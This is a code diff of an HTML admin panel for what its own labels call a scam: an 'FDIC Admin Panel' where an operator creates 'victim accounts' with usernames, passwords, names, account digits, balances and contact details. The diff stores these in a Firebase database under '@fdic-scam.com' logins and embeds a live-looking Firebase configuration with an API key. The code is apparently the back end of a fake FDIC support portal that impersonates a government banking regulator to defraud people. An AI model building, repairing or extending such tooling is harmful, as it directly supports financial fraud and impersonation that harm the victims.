@@ -4,27 +4,58 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>FDIC Admin Panel</title>
-  <link rel="stylesheet" href="style.css">
+  <style>
+    :root {
+      --fdic-blue: #003366;
+      --fdic-light-blue: #00509e;
+      --fdic-gray: #f4f6f8;
+      --text-dark: #333;
+      --white: #ffffff;
+      --border: #d1d5db;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background: var(--fdic-gray); color: var(--text-dark); }
+    
+    .header { background: #333; color: white; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
+    .header h2 { font-size: 20px; }
+    .logout-btn { background: #555; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+    .logout-btn:hover { background: #666; }
+    
+    .content { padding: 30px; max-width: 800px; margin: 0 auto; }
+    .card { background: var(--white); border-radius: 8px; padding: 25px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+    .card h3 { font-size: 18px; margin-bottom: 20px; color: var(--fdic-blue); border-bottom: 1px solid #eee; padding-bottom: 10px; }
+    
+    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    .form-group { margin-bottom: 15px; }
+    .form-group label { display: block; margin-bottom: 5px; font-size: 14px; font-weight: 500; color: #555; }
+    .form-group input, .form-group select { width: 100%; padding: 10px; border: 1px solid var(--border); border-radius: 4px; font-size: 14px; }
+    .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--fdic-light-blue); }
+    
+    .btn-save { background: #28a745; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; }
+    .btn-save:hover { background: #218838; }
+    
+    .status-msg { margin-top: 15px; font-size: 14px; font-weight: 500; }
+    .status-msg.success { color: #28a745; }
+    .status-msg.error { color: #d9534f; }
+  </style>
 </head>
 <body>
-  <div class="admin-header">
+
+  <div class="header">
     <h2>Admin Control Panel</h2>
-    <div>
-      <span class="telegram-status">Telegram: Connected</span>
-      <button onclick="app.handleLogout()" style="margin-left:10px; padding:5px 10px; background:#555; color:white; border:none; border-radius:4px; cursor:pointer;">Logout</button>
-    </div>
+    <button class="logout-btn" id="logoutBtn">Sign Out</button>
   </div>
 
   <div class="content">
     <div class="card">
       <h3>Create / Update Victim Account</h3>
-      <div class="admin-grid">
+      <div class="form-grid">
         <div class="form-group">
-          <label>Username (for login)</label>
+          <label>Username (Login)</label>
           <input type="text" id="vUsername" placeholder="e.g. john_doe">
         </div>
         <div class="form-group">
-          <label>Password (for login)</label>
+          <label>Password (Login)</label>
           <input type="text" id="vPassword" placeholder="e.g. password123">
         </div>
         <div class="form-group">
@@ -32,7 +63,7 @@
           <input type="text" id="vName" placeholder="John Doe">
         </div>
         <div class="form-group">
-          <label>Account Number (Last 4 Digits)</label>
+          <label>Last 4 Digits</label>
           <input type="text" id="vLast4" placeholder="1234" maxlength="4">
         </div>
         <div class="form-group">
@@ -54,33 +85,51 @@
           <label>Phone</label>
           <input type="text" id="vPhone" placeholder="(555) 123-4567">
         </div>
-        <div class="form-group">
+        <div class="form-group" style="grid-column: span 2;">
           <label>Address</label>
           <input type="text" id="vAddress" placeholder="123 Main St, City, ST">
         </div>
       </div>
-      <button class="admin-btn" id="saveBtn">Save Victim Data</button>
-    </div>
-
-    <div class="card">
-      <h3>Existing Victims</h3>
-      <p style="font-size:14px; color:#666;">Note: This feature requires iterating through the DB. For simplicity, use the form above to create/update. Delete functionality is advanced.</p>
+      <button class="btn-save" id="saveBtn">Save Victim Data</button>
+      <div class="status-msg" id="statusMsg"></div>
     </div>
   </div>
 
   <script type="module">
-    import { app } from "./app.js";
-    import { auth } from "./firebase-config.js";
-    import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+    import { getAuth, onAuthStateChanged, signOut, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
-    // Protect Admin Page
+    const firebaseConfig = {
+  apiKey: "AIzaSyBkx-EEG7HdjfIuHkxdWSZrjjFaX-hGy68",
+  authDomain: "fdicsupport-cae27.firebaseapp.com",
+  projectId: "fdicsupport-cae27",
+  storageBucket: "fdicsupport-cae27.firebasestorage.app",
+  messagingSenderId: "874213007292",
+  appId: "1:874213007292:web:bf04711a109df8c85b95b9"
+};
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+
+    // Check Auth
     onAuthStateChanged(auth, (user) => {
       if (!user) {
         window.location.href = "index.html";
+      } else {
+        document.querySelector('.header h2').textContent = `Admin: ${user.email}`;
       }
     });
 
-    // Save Button Logic
+    // Logout
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+      signOut(auth).then(() => {
+        window.location.href = "index.html";
+      });
+    });
+
+    // Save Victim
     document.getElementById('saveBtn').addEventListener('click', async () => {
       const username = document.getElementById('vUsername').value;
       const password = document.getElementById('vPassword').value;
@@ -91,17 +140,42 @@
       const email = document.getElementById('vEmail').value;
       const phone = document.getElementById('vPhone').value;
       const address = document.getElementById('vAddress').value;
+      const statusMsg = document.getElementById('statusMsg');
 
       if (!username || !password || !name || !last4 || !balance) {
-        alert("Please fill in all required fields (Username, Password, Name, Last 4, Balance).");
+        statusMsg.className = 'status-msg error';
+        statusMsg.textContent = "Please fill in all required fields.";
         return;
       }
 
+      statusMsg.className = 'status-msg';
+      statusMsg.textContent = "Creating account...";
+
       try {
-        await app.createVictimAccount(username, password, name, last4, type, balance, address, email, phone);
-        alert("Victim Account Created/Updated Successfully!");
+        const victimEmail = `${username}@fdic-scam.com`;
+        let userId;
+
+        // Try to create user, if exists, sign in to get UID
+        try {
+          const userCredential = await createUserWithEmailAndPassword(auth, victimEmail, password);
+          userId = userCredential.user.uid;
+        } catch (e) {
+          // User might already exist
+          const userCredential = await signInWithEmailAndPassword(auth, victimEmail, password);
+          userId = userCredential.user.uid;
+        }
+
+        // Save Data
+        const data = {
+          name, last4, type, balance, address, email, phone, createdAt: new Date().toISOString()
+        };
+        await set(ref(db, `users/${userId}`), data);
+
+        statusMsg.className = 'status-msg success';
+        statusMsg.textContent = "Success! Victim account created.";
       } catch (err) {
-        alert("Error: " + err.message);
+        statusMsg.className = 'status-msg error';
+        statusMsg.textContent = "Error: " + err.message;
       }
     });
   </script>
